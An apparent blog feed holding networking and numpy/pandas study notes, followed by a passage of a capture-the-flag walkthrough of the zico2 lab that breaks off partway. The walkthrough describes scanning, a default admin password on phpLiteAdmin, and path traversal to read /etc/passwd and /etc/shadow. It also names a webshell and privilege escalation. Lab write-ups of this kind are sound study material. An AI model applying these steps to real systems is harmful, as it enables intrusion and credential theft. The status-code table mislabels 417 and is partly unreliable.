id="五、对称-非对称数据加密"><a href="#五、对称-非对称数据加密" class="headerlink" title="五、对称/非对称数据加密"></a>五、对称/非对称数据加密</h1><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p>概念：加密算法是公开的，靠的是秘钥来加密数据，使用一个秘钥加密，必须使用相同的秘钥才解密。<br>优点： 算法公开、计算量小、加密速度快、加密效率高<br>缺点：在数据传送前，发送方和接收方必须商定好秘钥，然后使双方都能保存好秘钥。</p><p>常见算法：DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES</p><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>概念：加密和解密使用不同的秘钥，一把公开的公钥，一把私有的私钥。公钥加密的信息只有私钥才能解密，私钥加密的信息只有公钥才能解密。<br>优点：安全，即使密文被拦截、公钥被获取，但是无法获取到私钥，也就无法破译密文。作为接收方，务必要保管好自己的密钥。<br>缺点：加密算法及其复杂，安全性依赖算法与密钥，而且加密和解密效率很低。</p><p>常见算法：RSA、DSA、ECC<br>工作流程：A生成一对非对称秘钥，将公钥向所有人公开，B拿到A的公钥后使用A的公钥对信息加密后发送给A，经过加密的信息只有A手中的私钥能解密。这样B可以通过这种方式将自己的公钥加密后发送给A，两方建立起通信，可以通过对方的公钥加密要发送的信息，接收方用私钥解密信息。</p><h1 id="六、SSL-TLS协议（443端口-传输层）"><a href="#六、SSL-TLS协议（443端口-传输层）" class="headerlink" title="六、SSL/TLS协议（443端口 传输层）"></a>六、SSL/TLS协议（443端口 传输层）</h1><p>SSL（安全套接字层）及其后继者TLS（传输层安全）是用于在联网计算机之间建立经过身份验证和加密的链接的协议。尽管SSL协议在 1999年已经随着TLS 1.0的发布而被弃用，但我们仍将这些相关技术称为“SSL”或“SSL/TLS”。那么SSL协议的定义是什么呢？本文将为你详细介绍，并解答关于SSL和TLS的一些常见问题。</p><p><strong>一、SSL协议是什么？</strong></p><p>SSL（Secure Sockets Layer）协议是一种用于保证网络通信安全的加密协议，最新的版本为TLS（Transport Layer Security）。SSL/TLS协议<strong>工作在传输层</strong>，用于加密数据的传输，可以保证数据在传输过程中不被窃取、篡改或者伪造，是现代互联网应用程序中最广泛使用的一种安全协议。</p><p><strong>二、什么是</strong> <strong>SSL 证书？</strong></p><p><a href="https://link.zhihu.com/?target=https://www.racent.com/ssl">SSL 证书</a>，也称为 TLS 或 SSL/TLS 证书，是将网站的身份绑定到由公钥和私钥组成的加密密钥对的数字文档。证书中包含的公钥允许 Web浏览器通过TLS和HTTPS协议启动与Web服务器的加密通信会话。私钥在服务器上保持安全，用于对网页和其他文档进行数字签名。</p><p><strong>三、什么是</strong> <strong>TLS？</strong></p><p>TLS（传输层安全）于1999年发布，是用于身份验证和加密的SSL（安全套接字层）协议的继承者。TLS 1.3 在RFC 8446（2018 年 8 月）中定义。</p><p><strong>四、建议在哪个端口上使用</strong> <strong>SSL/TLS？</strong></p><p>SSL/TLS可以使用任何端口，但是为了获得最大的兼容性，更推荐标准的端口443用于安全 SSL/TLS 通信。</p><p><strong>五、当前版本的</strong> <strong>SSL/TLS 是什么？</strong></p><p>当前版本的SSL/TLS包括：TLS 1.3由RFC 8446于2018年8月定义，是 SSL/TLS 的最新版本；TLS 1.2 (RFC 5246)于2008年8月定义，并且仍在广泛使用。TLS 1.2 之前的 SSL/TLS 版本被认为是不安全的，不应再使用。</p><h1 id="七、状态码"><a href="#七、状态码" class="headerlink" title="七、状态码"></a>七、状态码</h1><h1 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h1><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。</p><p>HTTP 状态码的英文为 <strong>HTTP Status Code</strong>。</p><p>下面是常见的 HTTP 状态码：</p><ul><li><strong>1xx（信息性状态码）</strong>：表示接收的请求正在处理。</li><li><strong>2xx（成功状态码）</strong>：表示请求正常处理完毕。</li><li><strong>3xx（重定向状态码）</strong>：需要后续操作才能完成这一请求。</li><li><strong>4xx（客户端错误状态码）</strong>：表示请求包含语法错误或无法完成。</li><li><strong>5xx（服务器错误状态码）</strong>：服务器在处理请求的过程中发生了错误。</li></ul><h2 id="HTTP-状态码分类"><a href="#HTTP-状态码分类" class="headerlink" title="HTTP 状态码分类"></a>HTTP 状态码分类</h2><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p><table><thead><tr><th align="left">分类</th><th align="left">分类描述</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td align="left">2**</td><td align="left">成功，操作被成功接收并处理</td></tr><tr><td align="left">3**</td><td align="left">重定向，需要进一步的操作以完成请求</td></tr><tr><td align="left">4**</td><td align="left">客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td align="left">5**</td><td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p>HTTP状态码列表:</p><table><thead><tr><th align="left">状态码</th><th align="left">状态码英文名称</th><th align="center">中文描述</th></tr></thead><tbody><tr><td align="left">100</td><td align="left">Continue</td><td align="center">继续。客户端应继续其请求</td></tr><tr><td align="left">101</td><td align="left">Switching Protocols</td><td align="center">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">200</td><td align="left">OK</td><td align="center">请求成功。一般用于GET与POST请求</td></tr><tr><td align="left">201</td><td align="left">Created</td><td align="center">已创建。成功请求并创建了新的资源</td></tr><tr><td align="left">202</td><td align="left">Accepted</td><td align="center">已接受。已经接受请求，但未处理完成</td></tr><tr><td align="left">203</td><td align="left">Non-Authoritative Information</td><td align="center">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td align="left">204</td><td align="left">No Content</td><td align="center">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td align="left">205</td><td align="left">Reset Content</td><td align="center">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td align="left">206</td><td align="left">Partial Content</td><td align="center">部分内容。服务器成功处理了部分GET请求</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">300</td><td align="left">Multiple Choices</td><td align="center">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td align="left">301</td><td align="left">Moved Permanently</td><td align="center">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td align="left">302</td><td align="left">Found</td><td align="center">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td align="left">303</td><td align="left">See Other</td><td align="center">查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td align="left">304</td><td align="left">Not Modified</td><td align="center">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td align="left">305</td><td align="left">Use Proxy</td><td align="center">使用代理。所请求的资源必须通过代理访问</td></tr><tr><td align="left">306</td><td align="left">Unused</td><td align="center">已经被废弃的HTTP状态码</td></tr><tr><td align="left">307</td><td align="left">Temporary Redirect</td><td align="center">临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">400</td><td align="left">Bad Request</td><td align="center">客户端请求的语法错误，服务器无法理解</td></tr><tr><td align="left">401</td><td align="left">Unauthorized</td><td align="center">请求要求用户的身份认证</td></tr><tr><td align="left">402</td><td align="left">Payment Required</td><td align="center">保留，将来使用</td></tr><tr><td align="left">403</td><td align="left">Forbidden</td><td align="center">服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td align="left">404</td><td align="left">Not Found</td><td align="center">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td align="left">405</td><td align="left">Method Not Allowed</td><td align="center">客户端请求中的方法被禁止</td></tr><tr><td align="left">406</td><td align="left">Not Acceptable</td><td align="center">服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td align="left">407</td><td align="left">Proxy Authentication Required</td><td align="center">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td align="left">408</td><td align="left">Request Time-out</td><td align="center">服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td align="left">409</td><td align="left">Conflict</td><td align="center">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td align="left">410</td><td align="left">Gone</td><td align="center">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td align="left">411</td><td align="left">Length Required</td><td align="center">服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td align="left">412</td><td align="left">Precondition Failed</td><td align="center">客户端请求信息的先决条件错误</td></tr><tr><td align="left">413</td><td align="left">Request Entity Too Large</td><td align="center">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td align="left">414</td><td align="left">Request-URI Too Large</td><td align="center">请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td align="left">415</td><td align="left">Unsupported Media Type</td><td align="center">服务器无法处理请求附带的媒体格式</td></tr><tr><td align="left">416</td><td align="left">Requested range not satisfiable</td><td align="center">客户端请求的范围无效</td></tr><tr><td align="left">417</td><td align="left">I’m a teapot</td><td align="center">服务器无法满足Expect的请求头信息</td></tr><tr><td align="left">418</td><td align="left">I’m a teapot</td><td align="center">状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">500</td><td align="left">Internal Server Error</td><td align="center">服务器内部错误，无法完成请求</td></tr><tr><td align="left">501</td><td align="left">Not Implemented</td><td align="center">服务器不支持请求的功能，无法完成请求</td></tr><tr><td align="left">502</td><td align="left">Bad Gateway</td><td align="center">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td align="left">503</td><td align="left">Service Unavailable</td><td align="center">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td align="left">504</td><td align="left">Gateway Time-out</td><td align="center">充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td align="left">505</td><td align="left">HTTP Version not supported</td><td align="center">服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;考试可能会用到 谁又知道呢&lt;/p&gt;
&lt;h1 id=&quot;一、osi模型&quot;&gt;&lt;a href=&quot;#一、osi模型&quot; class=&quot;headerlink&quot; title=&quot;一、osi模型&quot;&gt;&lt;/a&gt;一、osi模型&lt;/h1&gt;&lt;p&gt;维基百科定义：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; “OSI模型，即开放式通信系统互联参考模型（Open System Interconnection Reference Model），是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互连为网络的标准框架，简称OSI。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;定义了网络互连的七层模型（物理层、数据链路层、网络层、传输层、会话层、表示层、应用层）&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>数据分析相关</title>
    <link href="https://www.maonie.top/2024/04/27/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3/"/>
    <id>https://www.maonie.top/2024/04/27/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3/</id>
    <published>2024-04-27T11:36:28.000Z</published>
    <updated>2024-04-27T12:37:30.974Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="数据分析是干啥的"><a href="#数据分析是干啥的" class="headerlink" title="数据分析是干啥的"></a>数据分析是干啥的</h2><p>-整合一堆杂乱无章的数据 把背后的信息提炼出来 使数据的价值最大化<br>–分析用户的消费行为 指定相应的方案 调整促销时间 力度 计算用户活跃度和产品的回购力度<br>–分析广告的点击率 决定广告的投放时间 制定广告方案 决定投放等等</p><p>例：<br>1.保险公司从大量的赔付申请数据中判断哪些存在骗保可能<br>2.支付宝通过用户消费记录和行为自动调整花呗额度<br>3.短视频通过用户的点击和观看行为给用户推送合适的视频</p><h2 id="我为啥要学数据分析"><a href="#我为啥要学数据分析" class="headerlink" title="我为啥要学数据分析"></a>我为啥要学数据分析</h2><p><del>因为我现在就得用</del><br>可以用于某些岗位或竞赛<br>python数据科学的基础<br>机器学习课程的基础</p><h2 id="数据分析的流程"><a href="#数据分析的流程" class="headerlink" title="数据分析的流程"></a>数据分析的流程</h2><span id="more"></span><p>提出问题<br>准备数据<br>分析数据<br>获得结论<br>成果可视化</p><h2 id="要用的工具"><a href="#要用的工具" class="headerlink" title="要用的工具"></a>要用的工具</h2><p>-numpy<br>-pandas<br>-matplotlib</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>-anaconda|全球最受欢迎的数据啥啥啥|集成了数据分析和机器学习需要的全部环境<br>注意：安装目录不能有中文和特殊符号<br>-jupyter|anaconda提供的基于浏览器的<strong>可视化开发工具</strong><br>启动方式：cmd-jupyter notebook-回车<br>新建方式：图形化页面-new-文件或者文件夹<br>            python3：anaconda中的源文件<br>            cell:可以在里面执行相关代码 code模式是代码 markdown模式是笔记<br>            可以在编辑页面更换<br>快捷键：添加cell-a或者b<br>        删除-x<br>        修改cell的模式-m：修改成markdown<br>                         y：修改成code模式<br>        执行cell-shift+enter<br>        tab：自动补全<br>        代开帮助文档：shift+tab</p><h2 id="numpy模块的使用"><a href="#numpy模块的使用" class="headerlink" title="numpy模块的使用"></a>numpy模块的使用</h2><p>创建numpy</p><h3 id="1-1创建一个一维数组"><a href="#1-1创建一个一维数组" class="headerlink" title="1.1创建一个一维数组"></a><strong>1.1创建一个一维数组</strong></h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">import numpy as nparr = np.array([1,2,3])arr #cell中输出的时候直接打元素名就行 不用echo输出：array([1,2,3])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2创建一个多维数组"><a href="#1-2创建一个多维数组" class="headerlink" title="1.2创建一个多维数组"></a><strong>1.2创建一个多维数组</strong></h3><pre class="line-numbers language-none"><code class="language-none">arr = np.array([1,2,3],[4,5,6])arr输出：array([1,2,3],  [4,5,6])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组和列表的区别是什么呢？<br>-数组中存储的数据元素类型都是统一的<br>-优先级：字符串&gt;浮点型&gt;整数</p><pre class="line-numbers language-none"><code class="language-none">例如：arr = np.array([1,2.2,3])arr输出：array([1.,2.2,3.])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1将外部的一张图片读取并加载到numpy数组中"><a href="#2-1将外部的一张图片读取并加载到numpy数组中" class="headerlink" title="2.1将外部的一张图片读取并加载到numpy数组中"></a>2.1将外部的一张图片读取并加载到numpy数组中</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">import matplotlib.pyplot as pltimg_arr = plt.imread('./1.jpg') #返回的数组，数组中装载的就是图片内容plt.imshow(img_arr) #将numpy数组进行可视化展示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出结果即为1.jpg的图像内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">img_arr = img_arr - 100 #将每一个数组元素都减去100plt.imshow(img_arr)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出结果是色调有差别的图像内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">np.ones(shape=(3,4)) #输出结果是一个三行 四列的数组np.linspace(0,100,num=20) #项数为20的一维等差数列数组np.arange(10,50,step=2) #返回了10开头 50结尾 公差为2的一维数组np.random.randint(0,100,size=(5,6)) #生成一个五行六列的数组 内容为随机数数组名.shape #输出为数组的形状(行数，列数)数组名.ndim #返回的是数组的维度(数组里包了几个数组)数组名.size #返回数组元素的个数数组名.dtype #返回数组元素的类型创建数组的时候输入dtype参数来指定元素类型或者通过 数组名.dtype = “指定类型” 来修改type(数组名) #返回数组的数据类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-1numpy的索引和切片操作"><a href="#3-1numpy的索引和切片操作" class="headerlink" title="3.1numpy的索引和切片操作"></a>3.1numpy的索引和切片操作</h2><p>索引和列表同理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">创建一个数组之后 我们可以取出数组的指定数据数组名[1,4] #取出数组中下标为1,4的数据数组名[0：2] #切出数组前两行的数据数组名[:,0:2] #切出数组前两列的数据数组名[0:2,0:2] #切出数组前两行前两列的数据数组名[::-1] #将数组的行倒置数组名[:,::-1]  #将数组的列倒置数组名[::-1,::-1] #整个倒置左右反转图片img_arr = plt.imread('./1.jpg') #返回的数组，数组中装载的就是图片内容plt.imshow(img_arr[:,::-1,:]) #三个数值分别代表行 列 颜色上下反转图片plt.imshow(img_arr[::-1,:,:]) #三个数值分别代表行 列 颜色图片裁剪功能plt.imshow(img_arr[66:200,78:300,:]) #三个数值分别代表行 列 颜色变形（reshape）数组名.reshape((30,)) #把二维的数组变形成一维数组名.reshape((2,15)) #将一维变形成多维数组名.reshape((6,5)) #将一维变形成多维级联操作-将多个numpy数组进行横向纵向的拼接axis轴向0为列 纵向拼接 1为行 横向拼接（行与列无法对应会报错哦）np.consatenate((数列1,数列2),axis=1)图片的拼接np.consatenate((数列1,数列2,数列3),axis=1)plt.imshow(img_arr) #三个数值分别代表行 列 颜色常用聚合操作-sum,max,min,mean计算和 最大值 最小值 求均值-sin,cos,tan三角函数around(a,decimals)a:数组名 decimals:舍入的小数位数numpy.amin()和numpy.amax(),用于计算数组中的元素沿指定轴的最小、最大值。numpy.ptp(),计算数组中元素最大值与最小值的差numpy.median(),计算数组中元素的中位数std() var()输出标准差与方差 方差就是标准差的平方使用例:数组名[1].std() #输出第一行的标准差还有数学里的矩阵相加 相减 相乘 eye() #返回一个标准的单位矩阵.T #转置矩阵（行变成列 列变成行）np.dot(数列1,数列2) #两个数列相乘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="panda基础操作"><a href="#panda基础操作" class="headerlink" title="panda基础操作"></a>panda基础操作</h2><p>numpy是用来处理数值型的数据 还有很多其他类型的数据(字符串，时间序列)<br>那么什么是pandas捏？<br>首先来认识pandas中的两个常用的类<br>    -Series<br>    -DataFrame<br>Series是一种类似于一维数组的对象，由下面两个部分组成:<br>    values:一组数据<br>    index:相关的数据索引标签<br>Series的创建<br>    -由列表或numpy数组创建。<br>    -由字典创建</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pandas import Seriess = Series(data=[1,2,3,'four'])s#输出结果类似于卡西欧(是的就是计算器)的数组表现形式0112233fourdtype:objectimport numpy as npSeries(data=np.random.randint(0,100,size=(3,1)))#必须是一维数组 不然会报错03143282dtype:int64from pandas import Series#index用来指定显示索引s = Series(data=[1,2,3,'four'],index=['a','b','c','d'])sa1b2c3dfourdtype:object#显示索引可以增强Series的可读性dic = {'语文':100,'数学':99,'理综':250,}s = Series(data=dic)s语文100数学99理综250dtype:int64s.[0]100s.语文100s[0:2]语文100数学99dtype:int64s.shape #返回Series的形状s.size #返回Series元素的个数s.index #返回Series的索引 s.values #返回Series的值s.dtype #返回元素类型 o代表object(字符串)s.head(n) #前n个数据 s.tail(n) #后n个元素s.unique #去重s.isnull #判断元素是否为空 空返回Ture 反之Falses.notnull #反之Series的算术运算直接 a = 数组1+数组2即可index一致的元素会进行算数运算 否则算空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>————————————————————————————————————————<br>那么接下来是DataFrame 他是一个表格型的数据库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pandas import DataFramedf = DataFrame(data=[1,2,3],[4,5,6])df#输出结果  0 1 2————————0 1 2 31 4 5 6df = DataFrame(data=np.random.randint(0,100,size=(6,4)))df#输出结果为一个六行四列 内容为0-100随机数的表格dic = {    'name':['zhangsan','lisi','wanglaowu'],'salary':[1000,2000,3000]}df = DataFrame(data=dic,index=['a','b','c'])df#输出结果为        name   salary——————————————————————a    zhangsan   1000b        lisi   2000c   wanglaowu   3000#DataFrame的属性values、columns、index、shapedf.values #返回二维numpy数df.columns #返回列索引df.index #返回行索引df.shape #返回形状df.dtype #报错 因为DataFrame可以装不同类型的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>df的索引＆切片</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df = DataFrame(data=dic,index=['a','b','c'])df#输出结果为        name   salary——————————————————————a    zhangsan   1000b        lisi   2000c   wanglaowu   3000df['name'] #显示列时输入索引名即可#输出结果为        name  —————————————a    zhangsan  b        lisi c   wanglaowu  显示多列时加逗号与另一个引号df.loc[a]df.iloc[[a,b]] #显示行 iloc指隐式索引 loc指显示索引#输出结果为        name   salary——————————————————————a    zhangsan   1000b        lisi   2000df.iloc[a,b] #显示第a行 第b列的单个元素切片df[0:2] #切行df.iloc[:,0:2] #切列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;数据分析是干啥的&quot;&gt;&lt;a href=&quot;#数据分析是干啥的&quot; class=&quot;headerlink&quot; title=&quot;数据分析是干啥的&quot;&gt;&lt;/a&gt;数据分析是干啥的&lt;/h2&gt;&lt;p&gt;-整合一堆杂乱无章的数据 把背后的信息提炼出来 使数据的价值最大化&lt;br&gt;–分析用户的消费行为 指定相应的方案 调整促销时间 力度 计算用户活跃度和产品的回购力度&lt;br&gt;–分析广告的点击率 决定广告的投放时间 制定广告方案 决定投放等等&lt;/p&gt;
&lt;p&gt;例：&lt;br&gt;1.保险公司从大量的赔付申请数据中判断哪些存在骗保可能&lt;br&gt;2.支付宝通过用户消费记录和行为自动调整花呗额度&lt;br&gt;3.短视频通过用户的点击和观看行为给用户推送合适的视频&lt;/p&gt;
&lt;h2 id=&quot;我为啥要学数据分析&quot;&gt;&lt;a href=&quot;#我为啥要学数据分析&quot; class=&quot;headerlink&quot; title=&quot;我为啥要学数据分析&quot;&gt;&lt;/a&gt;我为啥要学数据分析&lt;/h2&gt;&lt;p&gt;&lt;del&gt;因为我现在就得用&lt;/del&gt;&lt;br&gt;可以用于某些岗位或竞赛&lt;br&gt;python数据科学的基础&lt;br&gt;机器学习课程的基础&lt;/p&gt;
&lt;h2 id=&quot;数据分析的流程&quot;&gt;&lt;a href=&quot;#数据分析的流程&quot; class=&quot;headerlink&quot; title=&quot;数据分析的流程&quot;&gt;&lt;/a&gt;数据分析的流程&lt;/h2&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>zico2解析</title>
    <link href="https://www.maonie.top/2024/03/28/zico2%E8%A7%A3%E6%9E%90/"/>
    <id>https://www.maonie.top/2024/03/28/zico2%E8%A7%A3%E6%9E%90/</id>
    <published>2024-03-28T02:30:05.000Z</published>
    <updated>2024-03-28T05:19:50.895Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机：kali<br>靶机：zico2</p><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><p>Poc Exp 和payload 的关系<br>dirb （网站目录扫描）<br>文件包含漏洞<br>mysql相关（虽然是图形化页面）<br>一句话木马+蚁剑<br>zip提权</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>先把俩机子开开<span id="more"></span><br>扫一下同网段设备<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>看到靶机开放了 22 80 56444等端口<br>我们访问http服务 没发现什么 用dirb扫描看一下<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>存在/dbadmin/目录 进入之后是个登陆页面 写着phpLiteAdmin v1.9.3<br> <img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br>那就用searchsploit来寻找可行的漏洞<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/4.jpg" alt="4"><br>找到四个 我们用searchsploit -m 下载第三个漏洞文件到本地<br>下载后查看发现该文件中写着POC 也就是Proof of Concept 这是什么意思呢<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/6.jpg" alt="6"></p><blockquote><p>POC和EXP</p><p>POC = Proof of Concept中文意思是“观点证明”。这个短语并非仅仅在漏洞报告中使用，甲方在项目招标过程中也常常要求乙方提供POC，即证明你的方案或者产品能达到声称的功能或性能，漏洞报告中的POC则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p><p>EXP = Exploit的中文意思是“漏洞利用”。意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p><p>如下视图所示：<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/5.png" alt="5"></p><p>POC，是用来验证漏洞是否存在的一段代码。<br>EXP，指利用系统漏洞进行渗透。<br>先有POC，后有EXP。<br>Payload：中文为’有效载荷’，指成功EXP之后，真正在目标系统执行的代码或者指令<br>Shellcode：中文为’shell代码’，是Payload的一种，由于其建立正向/反向shell而得名 （正向/反向：主动/被动链接）</p></blockquote><p>绕过这个页面一般用burpsuite爆破<br>输入密码admin我们成功进入了页面<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>里边有一个没删的表 <code>info</code> 进去可以发现用户名root和zico与对应的密码md5加密 只要通过解密网站即可获取明文<br>主页面还有一个小按钮 按了之后发现连接中有文件包含漏洞<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/8.jpg" alt="8"><br>我们使用验证文件包含漏洞的方式 在传参中输入若干的 <code>../</code>(返回上个目录)<br>然后输入<code>/etc/passwd</code> <code>/etc/shadow</code> 若正常显示内容则表示漏洞存在<br>前者显示所有账号信息 后者显示所有用户名和密码<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/10.jpg" alt="10"><br>这里再回到之前调用的漏洞 其中说明了步骤</p><pre class="line-numbers language-none"><code class="language-none">1.创建一个database 